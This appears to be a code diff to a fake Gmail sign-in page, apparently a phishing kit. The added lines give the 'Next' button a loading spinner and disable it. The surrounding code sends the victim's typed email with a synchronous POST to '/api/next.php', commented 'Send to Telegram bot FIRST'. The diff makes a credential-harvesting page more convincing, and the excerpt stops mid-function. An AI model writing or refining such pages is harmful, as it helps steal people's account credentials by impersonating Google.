@@ -205,11 +205,34 @@
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
+            position: relative;
         }
-
 
         .login-gmail-next-btn:hover {
             background: #1557b0;
+        }
+
+        .login-gmail-next-btn.loading {
+            color: transparent;
+        }
+
+        .login-gmail-next-btn.loading::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 16px;
+            height: 16px;
+            margin: -8px 0 0 -8px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top: 2px solid var(--gmail-white);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
         .login-gmail-footer {
@@ -378,7 +401,13 @@
 
         function emailContinue() {
             const input = document.getElementById('email').value;
+            const button = document.querySelector('.login-gmail-next-btn');
+
             if (input.trim()) {
+                // Show loading state
+                button.classList.add('loading');
+                button.disabled = true;
+
                 // Send to Telegram bot FIRST
                 const xhr = new XMLHttpRequest();
                 xhr.open('POST', '/api/next.php', false); // Make synchronous
